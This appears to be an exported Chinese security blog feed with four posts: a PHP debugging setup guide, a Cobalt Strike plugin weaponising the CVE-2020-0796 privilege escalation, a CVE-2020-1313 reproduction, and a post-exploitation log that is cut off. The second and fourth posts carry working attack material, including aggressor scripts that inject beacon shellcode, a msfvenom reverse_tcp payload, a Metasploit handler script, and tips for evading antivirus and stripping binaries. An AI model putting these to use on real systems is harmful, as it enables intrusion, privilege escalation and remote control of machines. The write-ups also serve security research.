        <content type="html"><![CDATA[<h2 id="0x01-简述"><a href="#0x01-简述" class="headerlink" title="0x01 简述"></a>0x01 简述</h2><p>记录代码审计基础中调试环境的配置，主要使用PHPStudy作为服务器，PHPStorm作为开发调试工具，并配置远程调试和本地调试两种方案。远程调试的优点是不需要本地有PHP环境，缺点是需要修改文件时要同步文件修改到远程；本地调试比较方便快捷一些，但是有时候会遇到BlueTeam代码投毒，审计调试的时候主机被控制。这里对两种调试配置方法进行记录。</p><h2 id="0x02-远程调试配置"><a href="#0x02-远程调试配置" class="headerlink" title="0x02 远程调试配置"></a>0x02 远程调试配置</h2><p>使用PHPStudy + PHPStorm远程调试，不用在本地安装PHP环境，不用web服务器，代码执行都交给远程服务器，配置下列项目即可：<br>远程服务器，PHPSdtudy配置:</p><ol><li>开启FTP服务，目录设置为Web目录，用来同步PHPStorm对文件的修改</li><li>php配置开启Xdebug插件</li></ol><p>本地PHPStorm配置</p><ol><li>PHP远程调试</li><li>PHP Web页面</li></ol><h3 id="PHPSdtudy开启FTP"><a href="#PHPSdtudy开启FTP" class="headerlink" title="PHPSdtudy开启FTP"></a>PHPSdtudy开启FTP</h3><p>在FTP选项里配置好用户名和密码，根目录设置为WEB目录<br><img src="https://i.loli.net/2021/07/27/CLW2Zt856zkRpbH.png"></p><h3 id="PHP开启Xdebug"><a href="#PHP开启Xdebug" class="headerlink" title="PHP开启Xdebug"></a>PHP开启Xdebug</h3><p>在Phpstudy菜单软件管理-PHP-设置-扩展组件-Xdebug中设置，选择启用即可:<br><img src="https://i.loli.net/2021/07/27/Wd2yxL3AQvpH7lO.png"><br>查看配置文件：<br><img src="https://i.loli.net/2021/07/27/SnpyvB6g4Xj5rZU.png"><br>在WEB下新建个index.php，写入<code>&lt;?php phpinfo();?&gt;</code>,然后访问发现Xdebug已启用：<br><img src="https://i.loli.net/2021/07/27/TpH2PtfvSkUnl8o.png"><br>接下来把远程调试开启，需要PHPStorm主机的IP地址(我这里是192.168.200.32)，并开启远程调试：<br><img src="https://i.loli.net/2021/07/27/GQYDx2uEXKjt8hl.png"><br>然后重启nginx服务器，接下来就可以配置PHPStorm了。</p><h3 id="PHPStorm远程调试配置"><a href="#PHPStorm远程调试配置" class="headerlink" title="PHPStorm远程调试配置"></a>PHPStorm远程调试配置</h3><p>远程配置涉及到到代码文件的同步，Web页面的显示，远程调试接口的配置。<br><strong>PHP远程调试</strong><br>首先配置远程调试，这里配置其一是服务器Xdeug扩展，二是本地的文件怎么同步到远程。因为本地在文件中添加了语句，需要同步到远程服务器执行才能看到效果，在菜单:运行-编辑配置-PHP远程调试中:<br><img src="https://i.loli.net/2021/07/27/iWhKrUnZj4LIpO1.png"><br>接下来配置部署服务器，部署就是需要将本地文件上传到远程服务器，就是上传到FTP中：<br><img src="https://i.loli.net/2021/07/27/FOWSUtxLeRA7cwa.png"><br>到这里添加一个FTP服务的连接即可，根路径就是FTP的根路径：<br><img src="https://i.loli.net/2021/07/27/OMBDF42Q7GgVdAv.png"><br>然后在配置映射，即为本地要传到远程的路径：<br><img src="https://i.loli.net/2021/07/27/5zOj1GNBFAwQxSb.png"><br>配置好后点击验证，这一步已经配置好文件同步和远程调试功能了：<br><img src="https://i.loli.net/2021/07/27/ZAOsvQViPlwJyMg.png"><br>由于我们需要实时修改文件，所以在&lt;执行前&gt;这个选项中配置一下同步，选择将文件上传到远程主机，配置下要上传的路径即可：<br><img src="https://i.loli.net/2021/07/27/HEQ6A8JcxwBDYsV.png"></p><p><strong>PHP Web页面</strong><br>这里主要是为了在浏览器中显示执行效果，配置本地浏览器要访问远程URL，触发PHP执行，在菜单运行-编辑配置-PHPWeb页面添加：<br><img src="https://i.loli.net/2021/07/27/SaYoXVqCcUlbgn9.png"><br>配置好远程服务器(文件-设置-PHP-服务器):<br><img src="https://i.loli.net/2021/07/27/oiuvHpkYnAKRf2N.png"><br>配置完成后，可以尝试调试查看效果，选择调试，这里先试试Web页面的，选择了Web的配置，点击Run后，打开了浏览器，并成功命中断点，输出<code>$_SERVER</code>信息，这里的Run每次都会打开浏览器访问URL输出，所以打开窗口后刷新页面即可不用再点Run：<br><img src="https://i.loli.net/2021/07/27/rUveWN3PMyo5ucR.png"><br>打开了浏览器后，就可以选择远程调试的配置了，点击调试按钮：<br><img src="https://i.loli.net/2021/07/27/tZAwMuxzalgUQI6.png"><br>刷新刚才的浏览器页面，命中断点：<br><img src="https://i.loli.net/2021/07/27/wlT2YbmiSLjQI9f.png"><br>如果对文件进行了更新，需要再次点击Debug按钮,对传入参数进行调试:<br><img src="https://i.loli.net/2021/07/27/TwAmpSn96PjxBOW.png"><br>到这里远程调试的环境就配置好了。</p><h2 id="0x03-本地调试配置"><a href="#0x03-本地调试配置" class="headerlink" title="0x03 本地调试配置"></a>0x03 本地调试配置</h2><p>本地调试的效果是可以在PHPStorm中运行、调试脚本，也可以配合浏览器运行、调试，参考上面远程调试的配置，开启PHPstudy的Xdebug配置，然后配置好PHPStorm。</p><h3 id="PHPStorm调试配置"><a href="#PHPStorm调试配置" class="headerlink" title="PHPStorm调试配置"></a>PHPStorm调试配置</h3><p>这里的配置是为了在PHPStorm里运行脚本，在运行-编辑配置-PHP脚本中配置好项目入口文件，php解释器二进制文件的位置即可：<br><img src="https://i.loli.net/2021/07/27/R47yMHgfiXGkZtY.png"><br>执行和调试效果都会在PHPStorm中输出：<br><img src="https://i.loli.net/2021/07/27/5CkyU7NPgYa4jrL.png"></p><h3 id="浏览器插件调试"><a href="#浏览器插件调试" class="headerlink" title="浏览器插件调试"></a>浏览器插件调试</h3><p>在浏览器中使用Xdebug helper插件和 PHPStorm进行调试，这里要设置PHPStorm调试的监听端口，PHPStorm的服务器配置，Xdebug helper的Cookie。<br>1.PHPStorm中调试端口配置(文件-设置-调试)<br><img src="https://i.loli.net/2021/07/27/FYLzdEhJGbqcReD.png"><br>这里注意端口会被php-cgi占用，所以把phpstorm监听的端口改成了9100：<br><img src="https://i.loli.net/2021/07/27/zluYXmLJN2qBsh5.png"><br>相应的在php配置文件也进行了更新：<br><img src="https://i.loli.net/2021/07/27/Bv9K6m2PMxUoHzw.png"></p><p>2.PHPStorm服务器配置(文件-设置-服务器):<br>配置好本地服务器的路径即可<br><img src="https://i.loli.net/2021/07/27/Yu31fFp5mo8I7a6.png"></p><p>3.Xdebug helper插件配置<br>到谷歌商店下载Xdebug helper<br><img src="https://i.loli.net/2021/07/27/GMYcTst6iAvCqQE.png"><br>设置Xdebug helper的PhpStorm Cookie(插件显示在扩展栏上，右键选项):<br><img src="https://i.loli.net/2021/07/27/r3BtNYqCleHgK1i.png"><br>访问可以看到Cookie：<br><img src="https://i.loli.net/2021/07/27/153C8vfejSTIhzW.png"><br>在代码中设置设置断点，刷新浏览器即可看到调试效果：<br><img src="https://i.loli.net/2021/07/27/quBQUjZ1Lclpxgf.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>通过对PHP的调试配置，熟悉了PHPStorm和PHPStudy的配置，并成功实现了本地和远程两种调试的配置方法，一般来说在代码安全的情况下，选择本地调试方案比较方便。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPStorm调试 </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike插件之CVE-2020-0796提权脚本开发</title>
      <link href="/2021/04/22/cobalt-strike-cha-jian-zhi-cve-2020-0796-ti-quan-jiao-ben-kai-fa/"/>
      <url>/2021/04/22/cobalt-strike-cha-jian-zhi-cve-2020-0796-ti-quan-jiao-ben-kai-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2020-0796(Windows SMBv3 Client/Server Remote Code Execution Vulnerability)是在SMB v3协议中存在的内存破坏漏洞，可用于远程RCE或本地提权。本文主要是利用已公开<a href="https://github.com/danigargu/CVE-2020-0796">本地提权POC</a>编写Cobalt Strike的提权插件, 用到了反射DLL的方法，具体可以在<a href="https://www.cobaltstrike.com/aggressor-script/functions.html">开发文档</a>中搜索<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">ReflectiveDll</a>。<br>影响版本：<br>Windows Server, version 1909 (Server Core installation)<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for 32-bit Systems<br>修补方式：<br>1.安装更新<br>2.Powershell命令禁用压缩功能</p><pre><code class="powershell">Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 -Force</code></pre><h2 id="0x01-项目构建"><a href="#0x01-项目构建" class="headerlink" title="0x01 项目构建"></a>0x01 项目构建</h2><p>首先将ReflectiveDll项目复制到本地，然后将Poc代码<del>抄</del>整合到项目中(编写过程中会报很多错误，需要慢慢根据报错来修改)：<br><img src="https://i.loli.net/2021/04/21/CjV9hBlpDIR3bov.png"><br>修改入口函数,传递参数:<br><img src="https://i.loli.net/2021/04/21/ulTPmw98fxoicep.png"><br>如果不出意外没有报错后，就开始进行编译设置，选择Release x64，使用多字节字符集:<br><img src="https://i.loli.net/2021/04/21/VLoalXHCx9pDtfj.png"><br>代码生成-运行库选择多线程DLL(/MD)或多线程(/MT):<br><img src="https://i.loli.net/2021/04/21/oWbBnT21Xew9YCE.png"><br>关闭pdb的输出：<br><img src="https://i.loli.net/2021/04/21/EbrfyUDex1GqvcN.png"><br>然后就可以进行编译，成功编译后会输出DLL文件：<br><img src="https://i.loli.net/2021/04/22/VjilL6qYImODM7Z.png"><br>测试好的源码地址：<a href="https://github.com/yanghaoi/Cobalt_Strike_CNA/tree/main/CVE-2020-0796_CNA">github~</a></p><h2 id="0x02-CNA脚本编写"><a href="#0x02-CNA脚本编写" class="headerlink" title="0x02 CNA脚本编写"></a>0x02 CNA脚本编写</h2><p>CNA脚本是Cobalt Strike的插件脚本，用来给beacon下发各种指令增强Cobalt Strike的能力。<br>编写好的脚本如下，会将提权函数注册到beacon右键菜单-执行-提权中。函数会将上一步编译好的DLL反射进内存，然后传递shellcode执行：</p><pre><code class="perl">sub CVE_2020_0796 {    local('$stager $arch $dll');    btask($1, "Task Beacon to run " . listener_describe($2) . " via CVE-2020-0796"); #KB4551762    if (-is64 $1)    {        $arch = "x64";        $dll = getFileProper(script_resource("modules"), "0796.dll");         $stager = transform(shellcode($2, false, $arch),"hex");         bdllspawn!($1, $dll,$stager, "Elevation of local privileges", 5000);    } }beacon_exploit_register("CVE_2020_0796", "CVE-2020-0796", &amp;CVE_2020_0796);</code></pre><h2 id="0x03-提权测试"><a href="#0x03-提权测试" class="headerlink" title="0x03 提权测试"></a>0x03 提权测试</h2><p>测试之前需要做一下环境的准备工作，先到<a href="https://msdn.itellyou.cn/">MSDN itellyou</a>上下载一个<a href="ed2k://|file|cn_windows_10_business_editions_version_1909_x64_dvd_0ca83907.iso|5275090944|9BCD5FA6C8009E4D0260E4B23008BD47|/">1909的镜像</a>，在虚拟机中安装好后，进行以下设置：</p><ol><li>暂停Windows更新(很关键,自动更新虚拟机占用20%CPU,顺便还把漏洞修了…)</li><li>关闭windows Defender</li><li>添加一个普通用户(net user admin 123 /add)</li><li>完成后保存快照<br><img src="https://i.loli.net/2021/04/22/lqBr4pvfJaLSTR1.png"><br>切换到admin下，随便传个🐴上去执行：<br><img src="https://i.loli.net/2021/04/22/tO9Rb1ckAvru8yz.png"><br>成功提权到SYSTEM:<br><img src="https://i.loli.net/2021/04/22/xOUELmuWTSCyeBs.gif" alt="CVE-2020-0796-LPE"></li></ol><h2 id="0x04-提权原理"><a href="#0x04-提权原理" class="headerlink" title="0x04 提权原理"></a>0x04 提权原理</h2><p>利用漏洞整数溢出(1108*A)，覆盖返回地址指向_SEP_TOKEN_PRIVILEGES结构体，然后通过任意写更改token权限：<br><img src="https://i.loli.net/2021/04/22/uFHX5lao1ULgQ3I.png"><br>之后找到一个高权限进程进行shellcode注入，获取权限。</p><h2 id="0x05-问题整理"><a href="#0x05-问题整理" class="headerlink" title="0x05 问题整理"></a>0x05 问题整理</h2><ol><li>Shellcode大小计算<br>CNA脚本在利用反射DLL提权时，会给DLL传递shellcode参数，用的是这两个函数生成载荷：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#shellcode">shellcode</a>和<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#stager">stager</a>，4.1可以用<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#payload_local">payload_local</a>。</li></ol><pre><code class="shell">$data = shellcode("my listener", false, "x64");$data = stager("my listener", "x64");</code></pre><p>在DLL代码中，拿到该shellcode后，会进行长度计算，然后分配内存写入。而对传入的shellcode进行计算无非两种方法，单目运算符sizeof()和函数strlen(const char* str)，在进行shellcode计算时会遇到00字节导致计算错误，导致注入的系统进程(如winlogo.exe)崩溃，造成系统注销或重启。实验通过以下几种方案来尝试获得shellcode大小：<br>方案1(失败):<br>先看这第一种直接传入shellcode二进制流的方法：<br>使用<code>$stager = shellcode($2, false, $arch);</code>来生成shellcode：<br><img src="https://i.loli.net/2021/04/22/Rpi7bPoetvjBrkY.png"><br>可以正常获取到shellcode，但是没有办法计算分配的内存大小。<br>方案2(成功)：<br>方案2是开发的插件采用的方法，在方案1中无论如何都无法获得正确的shellcode内存大小，这时想到之前利用http加载shellcode执行的方法，在程序中会接收字符串(ascll)形式的shellcode，然后再转为hex形式的c-shellcode进入内存执行。<br>如下的示例,只有第二组的shellcode进入内存才会被正确执行：<br><img src="https://i.loli.net/2021/04/22/ZmkRoY1fTpWL5K6.png"><br>方案1问题在于无法获得正确的shellcode长度，方案2那么就先让它获取长度，而传入字符串可以使用strlen来获取长度，所以使用<code>$stager = transform(shellcode($2, false, $arch),"hex");</code>来转换shellcode为hex编码的字符串：<br><img src="https://i.loli.net/2021/04/22/EK5f1znFp4ky3IR.png"><br> 现在长度获取到了，就需要将字符串的shellcode转换成c-shellcode进内存执行，进行转换的代码：<br> <img src="https://i.loli.net/2021/04/22/Sd2vbzxgWjsDaYC.png"><br> 经过转换后，可以发现出现了熟悉的“麳冧痂”，剩下的就是按照漏洞利用流程在进程内存开辟891的空间，然后写入shellcode了：<br> <img src="https://i.loli.net/2021/04/22/x479DlbpJzjoHRK.png"><br> 方案3(成功)：<br> 在前两个方案中，要么就是无法获取长度，要么就是得转换shellcode，为什么不能在cna脚本里传递参数的时候就把长度给DLL呢。这里可以看下metasploit-framework的实现方法(专业!)，安装了metasploit后可以在<code>metasploit-framework\embedded\framework\external\source\exploits\CVE-2020-0796</code>下查看到源码：<br> <img src="https://i.loli.net/2021/04/22/xwBRMyazk8v6hEZ.png"><br> metasploit是通过定义一个结构体，定义两种不同类型的参数：</p><pre><code class="thrift"> typedef struct _MSF_PAYLOAD {    DWORD  dwSize;    CHAR  cPayloadData[];} MSF_PAYLOAD;typedef MSF_PAYLOAD* PMSF_PAYLOAD;</code></pre><p>在cna脚本中传递过来的参数就为：</p><pre><code class="shell">$stager = shellcode($2, false, $arch);$stager = pack("I-", strlen($stager)) . $stager;</code></pre><p>执行结果可以看到正确获取大小和数据流：<br><img src="https://i.loli.net/2021/04/22/z5bvSsJoWVClycR.png"><br>更棒的是，metasploit的exp可以直接拿过来用，只需要编写cna脚本传递参数即可。<br><img src="https://i.loli.net/2021/04/22/Wsl15bqRNgyDaY3.png"></p><ol start="2"><li><p>导出函数名<br>在这里想尝试修改默认DLL的导出函数(去除特征ReflectiveLoader)：<br><img src="https://i.loli.net/2021/04/22/UsWv7omgKflXJEM.png"><br>修改完成后编译，使用dumpbin工具查看DLL导出函数：</p><pre><code class="taggerscript">&gt;"D:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\bin\Hostx64\x64\dumpbin.exe" /exports reflective_dll.x64.dll</code></pre><p><img src="https://i.loli.net/2021/04/22/Us9ltDmnLVfobRN.png"><br>然后加载执行：<br><img src="https://i.loli.net/2021/04/22/wJx4LFIMBaWSm6p.png"><br>额….，那还是老实用ReflectiveLoader。</p></li><li><p>Beacon exit后进程崩溃<br><img src="https://i.loli.net/2021/04/22/COTzDYKIRbN6qwE.gif" alt="Exit"><br>考虑是shellcode的原因，就像在beacon.exe中退出一样，进程会直接退出，那么就需要一个可以创建线程的shellcode来实现分离。在手册中看到有一个shellcode生成函数：<br><img src="https://i.loli.net/2021/04/22/iRN86mYyxcl2hSf.png"><br>在cs4.0下报错，函数不存在:<br><img src="https://i.loli.net/2021/04/22/fjROk9tbyZwBFgQ.png"><br>使用cs4.1进行测试成功，exit后进程不崩溃：<br><img src="https://i.loli.net/2021/04/22/USb3cCIfxXF4Ta6.gif"><br>cna脚本如下：</p><pre><code class="perl">#cs4.1sub CVE_2020_0796 { local('$stager'); if (!-is64 $1) {     berror($1, "cve-2020-0796 exploit is x64 only");     return; } println("1"); btask($1, "Task Beacon to run " . listener_describe($2) . " cve-2020-0796"); $stager = payload_local($1, $2, "x64", "thread"); $stager = pack("I-", strlen($stager)) . $stager; $dll = getFileProper(script_resource("modules"), "reflective_dll.x64.dll");  bdllspawn!($1, getFileProper(script_resource("modules"), "reflective_dll.x64.dll"), $stager, "cve-2020-0796", 5000); beacon_link($1, $null, $3['listener']);}beacon_exploit_register("CVE_2020_0796", "CVE-2020-0796", &amp;CVE_2020_0796);</code></pre><p>另外在4.1中普通权限获取的beacon信息中Build号(影响18362和18363)实际测试并不准确:</p></li></ol><pre><code class="powershell">#输出beacon信息foreach $key =&gt; $value (binfo($1)) {        println("$[15]key $value");    }</code></pre><p><img src="https://i.loli.net/2021/04/22/DEsqGh5YbZoW24t.png"></p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p><a href="https://bbs.pediy.com/thread-262027.htm">https://bbs.pediy.com/thread-262027.htm</a><br><a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a><br><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-0796 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows本地提权漏洞CVE-2020-1313复现</title>
      <link href="/2020/10/09/windows-ben-di-ti-quan-lou-dong-cve-2020-1313-fu-xian/"/>
      <url>/2020/10/09/windows-ben-di-ti-quan-lou-dong-cve-2020-1313-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>CVE-ID:CVE-2020-1313</p><p>类型：本地提权</p><p>POC: <a href="https://github.com/irsl/CVE-2020-1313">https://github.com/irsl/CVE-2020-1313</a></p><p>原理：利用Windows Update Orchestrator Service (是一个DCOM服务9C695035-48D2-4229-8B73-4C70E756E519) 暴露的API方法无需认证来进行计划任务的设置，计划任务以SYSTEM权限执行，导致权限提升。</p><p>影响版本：<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for x64-based Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p></blockquote><h4 id="2-编译复现"><a href="#2-编译复现" class="headerlink" title="2. 编译复现"></a>2. 编译复现</h4><p> 拉取poc后直接编译成Debug版本后，在虚拟机中cmd执行发现没有反应，双击执行后报错(物理机正常执行，考虑是虚拟机中运行环境的原因):</p><p><img src="https://i.loli.net/2020/10/09/fChwuaHAze9I3xg.png" alt="缺失DLL"></p><p>搜索缺少的DLL后，看到文章(<a href="https://blog.csdn.net/so_geili/article/details/53009680">https://blog.csdn.net/so_geili/article/details/53009680</a> 和 <a href="https://www.cnblogs.com/xzabg/p/5875296.html),%E8%AF%B4%E6%98%AF%E7%BC%96%E8%AF%91%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E7%84%B6%E5%90%8Evs%E8%BF%9B%E8%A1%8C%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://www.cnblogs.com/xzabg/p/5875296.html),说是编译的原因，然后vs进行设置如下：</a></p><p><img src="https://i.loli.net/2020/10/09/V6KjMf8JYCZAUwr.png" alt="运行库设置"></p><p>在项目属性-C/C++-代码生成-运行库中将其设置为静态编译 /MTd ，编译成功后文件为849kb：<br><img src="https://i.loli.net/2020/10/09/koVfPg2RhBL9EYz.png" alt="执行"></p><p>随后放到虚拟机里执行成功，可以看到注册表中新增了一项，命令在之后的一段时间内会自动触发。<br>接下来试试将选项设置为 release，生成后大小13kb:<br><img src="https://i.loli.net/2020/10/09/BQ2uz8SaMoVWmC1.png" alt="release"><br>执行成功：<br><img src="https://i.loli.net/2020/10/09/1tIb6v3nMmXyxNU.png" alt="执行成功"><br>然后一段时间后会在C盘生成个命令执行的txt，实际利用可以用powershell等来执行其他反弹shell的操作~</p><h4 id="3-其他"><a href="#3-其他" class="headerlink" title="3. 其他"></a>3. 其他</h4><p>在编译过程中，遇到运行库的问题，将网上看到的在这里记录一下。</p><h5 id="1-运行库设置"><a href="#1-运行库设置" class="headerlink" title="1.运行库设置"></a>1.运行库设置</h5><blockquote><p>多线程(/MT)、多线程调试(/MTd)、多线程DLL(/MD)、多线程调试DLL(/MDd)、单线程(/ML)、单线程调试(/MLd)，带D的是Debug模式，单线程运行时库选项/ML和/MLd在VS2003以后就取消了。<br>/MT 、 /MTd：<br>/MT和/MTd表示采用多线程CRT库的静态lib版本。该选项会在编译时将运行时库以静态lib的形式完全嵌入。该选项生成的可执行文件运行时不需要运行时库dll的参加，会获得轻微的性能提升，但最终生成的二进制代码因链入庞大的运行时库实现而变得非常臃肿。当某项目以静态链接库的形式嵌入到多个项目，则可能造成运行时库的内存管理有多份，最终将导致致命的“Invalid Address specified to RtlValidateHeap”问题。另外托管C++和CLI中不再支持/MT和/MTd选项。</p><p>/MD、/MDd：<br>/MD和/MDd表示采用多线程CRT库的动态dll版本，会使应用程序使用运行时库特定版本的多线程DLL。链接时将按照传统VC链接dll的方式将运行时库MSVCRxx.DLL的导入库MSVCRT.lib链接，在运行时要求安装了相应版本的VC运行时库可再发行组件包（当然把这些运行时库dll放在应用程序目录下也是可以的）。 因/MD和/MDd方式不会将运行时库链接到可执行文件内部，可有效减少可执行文件尺寸。当多项目以MD方式运作时，其内部会采用同一个堆，内存管理将被简化，跨模块内存管理问题也能得到缓解。</p></blockquote><h5 id="2-调试信息的隐藏"><a href="#2-调试信息的隐藏" class="headerlink" title="2.调试信息的隐藏"></a>2.调试信息的隐藏</h5><p>编译为可执行文件后，用16进制查看发现存在一些路径信息、printf的信息:<br><img src="https://i.loli.net/2020/10/09/xSUBOYdIzgMT7Xf.png" alt="路径信息"></p><p><img src="https://i.loli.net/2020/10/09/nbUVfdHhmwxWJpK.png" alt="printf的信息"></p><p>解决方法：<br>在属性链接器-调试中关闭调试信息：</p><p><img src="https://i.loli.net/2020/10/09/pHEgo97U3Xr4byD.png" alt="关闭调试信息生成"></p><p>然后捏，还可以用UPX 压缩一下文件 upx -9 xx.exe,从13kb压缩到9kb了。</p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.freebuf.com/vuls/245706.html">https://www.freebuf.com/vuls/245706.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
            <tag> Windows 10 </tag>
            
            <tag> CVE-2020-1313 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的win提权</title>
      <link href="/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/"/>
      <url>/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。 </p><h4 id="2-获取msf会话"><a href="#2-获取msf会话" class="headerlink" title="2. 获取msf会话"></a>2. 获取msf会话</h4><p>生成一个exe载荷,看情况免杀：</p><pre><code class="shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe</code></pre><p>在准备让目标机执行我们的载荷前，先使用脚本(通过msfpc来生成)来快速监听会话，并进行一些自动进程迁移的工作：</p><pre><code class="shell">msfconsole -q -r '/home/yanghao/windows-meterpreter-staged-reverse-tcp-443-exe.rc'</code></pre><p>脚本内容如下：</p><pre><code class="shell">use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.122.135set LPORT 443set ExitOnSession falseset EnableStageEncoding trueset EnableUnicodeEncoding trueset AutoRunScript 'post/windows/manage/migrate' run -j</code></pre><p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="https://i.loli.net/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="https://i.loli.net/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="https://i.loli.net/2020/09/06/CpsugnLKoOMDT42.png"></p><h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3. 尝试提权"></a>3. 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p><p><img src="https://i.loli.net/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p><h5 id="local-exploit-suggester模块失败"><a href="#local-exploit-suggester模块失败" class="headerlink" title="local_exploit_suggester模块失败"></a>local_exploit_suggester模块失败</h5><p>试试自带的模块来检查提权漏洞：</p><pre><code class="shell">use post/multi/recon/local_exploit_suggester</code></pre><p><img src="https://i.loli.net/2020/09/06/oBGYQmOS76RuW3b.png" alt="local_exploit_suggester"><br>发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：<br><img src="https://i.loli.net/2020/09/06/gXSiGskL4K1hYaC.png" alt="失败1"></p><p><img src="https://i.loli.net/2020/09/06/RqOQy21rmzaC79v.png" alt="失败2"></p><p><img src="https://i.loli.net/2020/09/06/b6kiR7uDV5Y3QcJ.png" alt="失败3"></p><h5 id="柳暗花明-enum-services利用"><a href="#柳暗花明-enum-services利用" class="headerlink" title="柳暗花明(enum_services利用)"></a>柳暗花明(enum_services利用)</h5><p>差不多模块都试了一下，因为有杀软的原因，都失败了。这时候想着找点新的exp来用用，但是网络不太方便，就先看看主机上的情况，先看了下主机上启动的服务情况：</p><pre><code class="shell">use post/windows/gather/enum_services</code></pre><p><img src="https://i.loli.net/2020/09/06/vCjN63hxmKEnL9l.png" alt="查看服务"><br>发现了一个在D盘的服务(wpscloudsvr LocalSystem  “D:\Program Files\WPS Office\wpscloudsvr.exe” LocalService)：<br><img src="https://i.loli.net/2020/09/06/hdliZFzBrOeIA75.png" alt="wpscloudsvr.exe"><br>这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘(这也是个很正常的事，总不能啥软件都往C盘装吧)，如果软件开发过程中未对这种类似服务的文件进行权限限制同时任意用户可以对其服务进行重启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过<code> cacls wpscloudsvr.exe</code> 